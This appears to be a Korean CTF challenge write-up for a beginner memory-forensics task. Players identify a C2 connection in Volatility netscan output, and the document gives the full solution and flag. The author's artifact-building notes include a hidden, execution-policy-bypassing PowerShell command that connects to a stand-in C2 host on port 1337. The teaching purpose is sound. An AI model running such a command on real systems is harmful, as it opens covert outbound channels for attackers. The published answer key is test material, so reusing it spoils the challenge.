---
title: 메모리 속 네트워크 연결 및 C2 매핑 (Memory Netscan)
created: 2026-06-28
updated: 2026-06-28
type: ctf-challenge
tags: [ctf, ctf-challenge, forensics, memory, volatility, netscan, socket, network-forensics]
confidence: high
---

# 메모리 속 네트워크 연결 및 C2 매핑 (Memory Netscan)

> **난이도**: 초급  
> **소요 시간**: 15~20분  
> **참고 picoCTF 문제**: 메모리 덤프 네트워크 활성 세션 추적 (Volatility Netscan 플러그인 응용)

## 1. 배경 시나리오
사내 윈도우 웹 서버가 비정상적인 트래픽을 외부로 송출하는 침해 징후가 검출되었습니다. 침해 대응팀은 현장에서 서버의 물리 휘발성 메모리(RAM)를 `memory.dmp` 파일로 급히 덤프하고 시스템을 격리했습니다. 공격자는 메모리 상에서 암호화된 백도어 프로세스를 가동시켜 외부 C2 서버와 실시간으로 세션을 맺고 원격 셸을 열어둔 상태였습니다. 휘발성 메모리 분석 도구인 **Volatility 3**를 가동하여 획득한 네트워크 소켓 스캔 결과 덤프 `volatility_netscan_output.txt` 파일이 제공됩니다. 이 덤프를 분석하여 **해커의 C2 연결을 수립하고 있던 비인가 프로세스명, PID, 그리고 C2 서버의 IP와 접속 포트 번호**를 조합한 플래그를 완성해야 합니다.

## 2. 제공 파일
* `volatility_netscan_output.txt` (Volatility 3의 `windows.netscan` 플러그인을 돌려 획득한 원시 네트워크 연결 상태 출력 파일)

## 3. 문제 목표
메모리 포렌식 프레임워크(Volatility)의 네트워크 소켓 식별 원리를 이해하고, 스캔 덤프 내에서 외국의 의심스러운 특정 포트(예: 역방향 셸 포트 1337, 4444 등) 또는 이례적인 외부 IP 연결 상태(`ESTABLISHED`) 정보를 지닌 소켓 테이블 행을 식별하여 그 메타데이터를 정합합니다.

## 4. 의도한 풀이 흐름
1. **네트워크 덤프 리포트 분석**:
   * 제공된 `volatility_netscan_output.txt` 텍스트 파일을 엽니다.
   * Volatility `netscan` 덤프는 다음과 같은 열로 정렬된 테이블 구조를 가집니다:
     `Offset | Proto | Local Address | Foreign Address | State | PID | Owner | Created`
2. **의심 연결 세션 필터링**:
   * 연결 상태가 `ESTABLISHED`인 행들을 우선적으로 정렬하거나 필터링합니다:
     ```bash
     grep "ESTABLISHED" volatility_netscan_output.txt
     ```
   * 조회 결과, 로컬 서버 사설망(`192.168.1.15:49218`)에서 외부 대역의 의심스러운 IP 주소 및 포트(`198.51.100.82:1337`)로 연결을 맺고 있는 아래의 프로세스 통신 세션을 발견합니다:
     `0xdf81aa021c10 TCPv4 192.168.1.15:49218 198.51.100.82:1337 ESTABLISHED 4104 powershell.exe`
3. **포렌식 파라미터 조합**:
   * 검출한 행에서 플래그 요구 인자들을 추출합니다:
     * 소유 프로세스명 (`Owner`): `powershell.exe`
     * 프로세스 아이디 (`PID`): `4104`
     * 목적지 C2 서버 IP (`Foreign IP`): `198.51.100.82`
     * 목적지 접속 포트 (`Foreign Port`): `1337`
4. **최종 플래그 완성**:
   * 추출한 정보들을 지정된 언더스코어(_) 형식 규칙에 따라 직렬화하여 제출합니다:
     `picoCTF{powershell.exe_4104_198.51.100.82_1337}`

## 5. 정답(플래그) 규칙 및 예시
* **플래그 형식**: `picoCTF{<process_name>_<pid>_<remote_ip>_<remote_port>}`
* **예시**: `picoCTF{powershell.exe_4104_198.51.100.82_1337}`

## 6. 출제자 노트 & 파일 제작 가이드
* **아티팩트 제작 방법**:
  1. 윈도우 가상 머신에서 리버스 커넥션 파워셸 셸 명령을 구동합니다:
     `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("198.51.100.82", 1337)` (이때 백그라운드 구동 PID가 4104라고 가정)
  2. 시스템 메모리 덤프를 가동해 `memory.dmp`를 확보하거나, Volatility를 구동하여 네트워크 연결 내역을 문자열 덤프로 변환합니다:
     `python3 vol.py -f memory.dmp windows.netscan > volatility_netscan_output.txt`
  3. 덤프 결과 창 내에 정상 웹 서비스(포트 80, 443 등)와 기본 OS 연결 이력(RPC, NetBIOS 등)을 50~100줄 분량의 노이즈 데이터로 적절히 구성하여 배포용 텍스트 파일로 확정합니다.
* **출제 포인트**: 
  * 로컬 호스트상의 침해 흔적(Prefetch, Event Log) 분석뿐 아니라, 메모리 포렌식의 정수인 물리 메모리 덤프를 매개로 당시의 동적 소켓(Socket) 연결 상태를 실시간 스캔해 내어 백도어 프로세스의 물리 실체와 원격 C2 통신 기점을 결합하는 다차원 상관 분석 능력을 강화합니다.

## 7. 트러블슈팅 및 힌트
* **Q. Volatility 3에서 netscan 명령이 정상 작동하지 않고 플러그인 에러가 납니다.**
  * A. Volatility 3는 메모리 이미지의 운영체제 빌드 번호를 자동 식별하기 위해 온라인 싱크를 통해 'Symbol' 패키지를 사전에 다운로드해야 합니다. 네트워크가 차단된 환경인 경우, 윈도우 프로필 기호를 수동 매핑(Symbol path 지정)해 주어야 파싱 에러를 우회할 수 있습니다. 본 문제는 가동 완료된 최종 텍스트 덤프가 주어지므로 복잡한 로컬 파싱 없이도 해결이 가능합니다.
* **Q. netscan과 netstat 명령어 플러그인의 차이는 무엇인가요?**
  * A. `netstat`은 운영체제가 관리하는 활성 TCP/UDP 테이블 구조체만 읽어 출력하므로 커널 동작 상태에 의존합니다. 반면 `netscan`은 메모리 영역 전체를 카빙식으로 스캔하여, 이미 연결이 해제(Closed)되었거나 비활성 상태가 되어 테이블에서 소거된 잔재 네트워크 구조체 바이트까지 긁어서 복구해 낸다는 강력한 차이점이 있습니다.

## 8. 학습 포인트
* **메모리 네트워크 분석**: 활성 물리 메모리 내부에서 네트워크 프로토콜 제어 블록(TCP_Listener, Endpoint 등)의 구조체 시그니처를 스캔하는 메모리 카빙 원리를 습득합니다.
* **C2 연결 상관분석**: 네트워크 세션의 발신지/목적지 정보와 이를 기동한 OS 프로세스 컨텍스트(PID 및 이미지 경로)를 결합하여 최종 악성 주체를 추적하는 DFIR 실무 프로세스를 이해합니다.
